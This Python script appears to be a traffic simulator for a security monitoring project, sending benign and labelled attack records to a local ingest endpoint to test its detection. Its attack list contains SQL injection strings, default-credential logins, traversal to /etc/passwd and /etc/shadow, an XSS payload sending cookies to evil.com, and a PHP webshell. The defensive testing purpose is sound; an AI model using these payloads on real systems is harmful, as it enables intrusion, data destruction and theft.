"""
CHIMERA Attack Replay Simulator
================================
Asynchronous traffic simulator that replays a configurable mix of benign
requests and real-world attack vectors against the CHIMERA ingest endpoint.

Usage:
    python simulator/attack_replay.py
    python simulator/attack_replay.py --target http://localhost:8000/api/ingest --rounds 3 --delay 0.3
"""

import asyncio
import argparse
import random
import json
import sys
from datetime import datetime, timezone
from typing import Any, Dict, List

try:
    import httpx
except ImportError:
    print("[!] httpx not installed. Run: pip install httpx")
    sys.exit(1)


# ── Default Configuration ─────────────────────────────────────────────────
DEFAULT_TARGET = "http://localhost:8000/api/ingest"
DEFAULT_ROUNDS = 2
DEFAULT_DELAY_MIN = 0.05
DEFAULT_DELAY_MAX = 0.3


# ── Traffic Generators ────────────────────────────────────────────────────

def _ts() -> str:
    return datetime.now(timezone.utc).isoformat()


def _rand_ip() -> str:
    return f"{random.randint(1,254)}.{random.randint(0,254)}.{random.randint(0,254)}.{random.randint(1,254)}"


BENIGN_PAYLOADS: List[Dict[str, Any]] = [
    {
        "source_ip": "10.0.1.22",
        "destination_ip": "10.0.0.5",
        "endpoint": "/static/css/main.css",
        "method": "GET",
        "headers": {"user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/124.0.0.0 Safari/537.36"},
        "body": "",
    },
    {
        "source_ip": "10.0.1.45",
        "destination_ip": "10.0.0.5",
        "endpoint": "/",
        "method": "GET",
        "headers": {"user-agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 14_4) AppleWebKit/605.1.15 Safari/605.1.15"},
        "body": "",
    },
    {
        "source_ip": "10.0.2.100",
        "destination_ip": "10.0.0.5",
        "endpoint": "/api/v1/products?page=1&limit=20",
        "method": "GET",
        "headers": {"user-agent": "Mozilla/5.0 (X11; Linux x86_64) Gecko/20100101 Firefox/125.0", "accept": "application/json"},
        "body": "",
    },
    {
        "source_ip": "10.0.3.15",
        "destination_ip": "10.0.0.5",
        "endpoint": "/api/v1/user/profile",
        "method": "GET",
        "headers": {"user-agent": "Mozilla/5.0 Chrome/124.0.0.0", "authorization": "Bearer eyJhbGciOiJIUzI1NiJ9.valid_token"},
        "body": "",
    },
    {
        "source_ip": "10.0.1.88",
        "destination_ip": "10.0.0.5",
        "endpoint": "/api/v1/search",
        "method": "POST",
        "headers": {"user-agent": "Mozilla/5.0 Chrome/124.0.0.0", "content-type": "application/json"},
        "body": '{"query": "wireless headphones", "category": "electronics"}',
    },
    {
        "source_ip": "10.0.2.55",
        "destination_ip": "10.0.0.5",
        "endpoint": "/static/js/app.bundle.js",
        "method": "GET",
        "headers": {"user-agent": "Mozilla/5.0 Safari/605.1.15"},
        "body": "",
    },
    {
        "source_ip": "10.0.4.12",
        "destination_ip": "10.0.0.5",
        "endpoint": "/api/v1/cart",
        "method": "POST",
        "headers": {"user-agent": "Mozilla/5.0 Chrome/124.0.0.0", "content-type": "application/json"},
        "body": '{"product_id": "abc-123", "quantity": 2}',
    },
]


ATTACK_PAYLOADS: List[Dict[str, Any]] = [
    # ── SQL Injection ─────────────────────────────────────────────────
    {
        "source_ip": "185.220.101.34",
        "destination_ip": "10.0.0.5",
        "endpoint": "/api/v1/users?id=1",
        "method": "GET",
        "headers": {"user-agent": "sqlmap/1.7.2#stable (https://sqlmap.org)"},
        "body": "id=1' UNION SELECT null, username, password FROM users--",
        "_label": "SQLi — UNION-based extraction",
    },
    {
        "source_ip": "91.240.118.172",
        "destination_ip": "10.0.0.5",
        "endpoint": "/api/v1/search",
        "method": "POST",
        "headers": {"user-agent": "python-requests/2.31.0", "content-type": "application/x-www-form-urlencoded"},
        "body": "q=' OR 1=1; DROP TABLE users;--",
        "_label": "SQLi — DROP TABLE attempt",
    },
    {
        "source_ip": "45.155.205.88",
        "destination_ip": "10.0.0.5",
        "endpoint": "/api/v1/products",
        "method": "GET",
        "headers": {"user-agent": "sqlmap/1.7.2#stable"},
        "body": "category=electronics' AND SLEEP(5)--",
        "_label": "SQLi — blind time-based",
    },

    # ── Credential Stuffing ───────────────────────────────────────────
    {
        "source_ip": "103.35.191.20",
        "destination_ip": "10.0.0.5",
        "endpoint": "/api/v1/auth/login",
        "method": "POST",
        "headers": {"user-agent": "python-requests/2.31.0", "content-type": "application/json"},
        "body": '{"username": "admin", "password": "admin123"}',
        "_label": "Credential Stuffing — admin:admin123",
    },
    {
        "source_ip": "103.35.191.20",
        "destination_ip": "10.0.0.5",
        "endpoint": "/api/v1/auth/login",
        "method": "POST",
        "headers": {"user-agent": "python-requests/2.31.0", "content-type": "application/json"},
        "body": '{"username": "root", "password": "toor"}',
        "_label": "Credential Stuffing — root:toor",
    },
    {
        "source_ip": "103.35.191.20",
        "destination_ip": "10.0.0.5",
        "endpoint": "/api/v1/auth/login",
        "method": "POST",
        "headers": {"user-agent": "python-requests/2.31.0", "content-type": "application/json"},
        "body": '{"username": "administrator", "password": "Password1!"}',
        "_label": "Credential Stuffing — administrator:Password1!",
    },

    # ── Directory Traversal / LFI ─────────────────────────────────────
    {
        "source_ip": "194.26.29.113",
        "destination_ip": "10.0.0.5",
        "endpoint": "/api/v1/files?path=../../../../../../etc/passwd",
        "method": "GET",
        "headers": {"user-agent": "curl/8.5.0"},
        "body": "",
        "_label": "Directory Traversal — /etc/passwd",
    },
    {
        "source_ip": "194.26.29.113",
        "destination_ip": "10.0.0.5",
        "endpoint": "/api/v1/download?file=....//....//....//etc/shadow",
        "method": "GET",
        "headers": {"user-agent": "curl/8.5.0"},
        "body": "",
        "_label": "Directory Traversal — /etc/shadow (bypass)",
    },

    # ── Brute Force Port/Endpoint Scanning ────────────────────────────
    {
        "source_ip": "45.33.32.156",
        "destination_ip": "10.0.0.5",
        "endpoint": "/admin",
        "method": "GET",
        "headers": {"user-agent": "Nmap Scripting Engine; https://nmap.org/book/nse.html"},
        "body": "",
        "_label": "Brute Force Scan — /admin",
    },
    {
        "source_ip": "45.33.32.156",
        "destination_ip": "10.0.0.5",
        "endpoint": "/wp-admin/admin-ajax.php",
        "method": "GET",
        "headers": {"user-agent": "gobuster/3.6"},
        "body": "",
        "_label": "Brute Force Scan — WordPress enumeration",
    },
    {
        "source_ip": "45.33.32.156",
        "destination_ip": "10.0.0.5",
        "endpoint": "/.env",
        "method": "GET",
        "headers": {"user-agent": "dirbuster/1.0"},
        "body": "",
        "_label": "Brute Force Scan — .env file probe",
    },

    # ── XSS / Webshell ────────────────────────────────────────────────
    {
        "source_ip": "77.91.124.20",
        "destination_ip": "10.0.0.5",
        "endpoint": "/api/v1/comments",
        "method": "POST",
        "headers": {"user-agent": "Mozilla/5.0 Chrome/124.0.0.0", "content-type": "application/json"},
        "body": '{"comment": "<script>document.location=\'https://evil.com/steal?c=\'+document.cookie</script>"}',
        "_label": "XSS — reflected cookie theft",
    },
    {
        "source_ip": "77.91.124.20",
        "destination_ip": "10.0.0.5",
        "endpoint": "/api/v1/upload",
        "method": "POST",
        "headers": {"user-agent": "python-requests/2.31.0", "content-type": "multipart/form-data"},
        "body": '<?php system($_GET["cmd"]); ?>',
        "_label": "Webshell upload — PHP RCE",
    },
]


# ── Colorized Console Output ──────────────────────────────────────────────

class _Colors:
    GREEN = "\033[92m"
    RED = "\033[91m"
    YELLOW = "\033[93m"
    CYAN = "\033[96m"
    DIM = "\033[2m"
    BOLD = "\033[1m"
    RESET = "\033[0m"


def _print_result(idx: int, kind: str, label: str, response: dict):
    action = response.get("action", "unknown")
    score = response.get("xgb_score", 0.0)
    event_id = response.get("event_id", "?")[:8]

    if action == "escalated":
        color = _Colors.RED
        icon = "[!!]"
    elif action == "dropped":
        color = _Colors.GREEN
        icon = "[OK]"
    else:
        color = _Colors.YELLOW
        icon = "[??]"

    score_bar = "#" * int(score * 20) + "-" * (20 - int(score * 20))

    kind_color = _Colors.CYAN if kind == "BENIGN" else _Colors.RED
    print(
        f"  {_Colors.DIM}#{idx:03d}{_Colors.RESET}  "
        f"{icon} {color}{action.upper():>9}{_Colors.RESET}  "
        f"{_Colors.DIM}[{score_bar}]{_Colors.RESET} {score:.4f}  "
        f"{kind_color}{kind:>8}{_Colors.RESET}  "
        f"{_Colors.DIM}{label}{_Colors.RESET}  "
        f"{_Colors.DIM}({event_id}...){_Colors.RESET}"
    )


# ── Main Replay Loop ─────────────────────────────────────────────────────

async def replay(target: str, rounds: int, delay_min: float, delay_max: float):
    """Run the attack replay simulation."""
    print(f"\n{_Colors.BOLD}{'=' * 80}{_Colors.RESET}")
    print(f"{_Colors.BOLD}  CHIMERA Attack Replay Simulator{_Colors.RESET}")
    print(f"{_Colors.DIM}  Target: {target}{_Colors.RESET}")
    print(f"{_Colors.DIM}  Rounds: {rounds} | Delay: {delay_min}s - {delay_max}s{_Colors.RESET}")
    print(f"{_Colors.BOLD}{'=' * 80}{_Colors.RESET}\n")

    stats = {"total": 0, "dropped": 0, "escalated": 0, "errors": 0}

    async with httpx.AsyncClient(timeout=10.0) as client:
        for round_num in range(1, rounds + 1):
            print(f"{_Colors.BOLD}  -- Round {round_num}/{rounds} --{_Colors.RESET}")

            # Build shuffled playlist: 60% benign, 40% attack
            playlist = []
            for p in random.sample(BENIGN_PAYLOADS, min(5, len(BENIGN_PAYLOADS))):
                playlist.append(("BENIGN", p.get("endpoint", "/"), {k: v for k, v in p.items() if k != "_label"}))
            for p in random.sample(ATTACK_PAYLOADS, min(7, len(ATTACK_PAYLOADS))):
                label = p.get("_label", p.get("endpoint", "/"))
                clean = {k: v for k, v in p.items() if k != "_label"}
                playlist.append(("ATTACK", label, clean))

            random.shuffle(playlist)

            for kind, label, payload in playlist:
                stats["total"] += 1
                payload["timestamp"] = _ts()

                # Randomize source IPs for brute-force realism
                if kind == "ATTACK" and random.random() < 0.3:
                    payload["source_ip"] = _rand_ip()

                try:
                    resp = await client.post(target, json=payload)
                    data = resp.json()
                    _print_result(stats["total"], kind, label, data)

                    if data.get("action") == "escalated":
                        stats["escalated"] += 1
                    else:
                        stats["dropped"] += 1

                except Exception as e:
                    stats["errors"] += 1
                    print(f"  {_Colors.RED}#{stats['total']:03d}  [X] ERROR: {e}{_Colors.RESET}")

                await asyncio.sleep(random.uniform(delay_min, delay_max))

            print()

    # Summary
    print(f"{_Colors.BOLD}{'=' * 80}{_Colors.RESET}")
    print(f"{_Colors.BOLD}  Simulation Complete{_Colors.RESET}")
    print(f"  Total: {stats['total']}  |  "
          f"{_Colors.GREEN}Dropped: {stats['dropped']}{_Colors.RESET}  |  "
          f"{_Colors.RED}Escalated: {stats['escalated']}{_Colors.RESET}  |  "
          f"Errors: {stats['errors']}")
    print(f"{_Colors.BOLD}{'=' * 80}{_Colors.RESET}\n")


# ── CLI Entry Point ───────────────────────────────────────────────────────

def main():
    parser = argparse.ArgumentParser(description="CHIMERA Attack Replay Simulator")
    parser.add_argument("--target", default=DEFAULT_TARGET, help=f"Ingest endpoint URL (default: {DEFAULT_TARGET})")
    parser.add_argument("--rounds", type=int, default=DEFAULT_ROUNDS, help=f"Number of replay rounds (default: {DEFAULT_ROUNDS})")
    parser.add_argument("--delay-min", type=float, default=DEFAULT_DELAY_MIN, help=f"Min delay between requests in seconds (default: {DEFAULT_DELAY_MIN})")
    parser.add_argument("--delay-max", type=float, default=DEFAULT_DELAY_MAX, help=f"Max delay between requests in seconds (default: {DEFAULT_DELAY_MAX})")
    args = parser.parse_args()

    asyncio.run(replay(args.target, args.rounds, args.delay_min, args.delay_max))


if __name__ == "__main__":
    main()
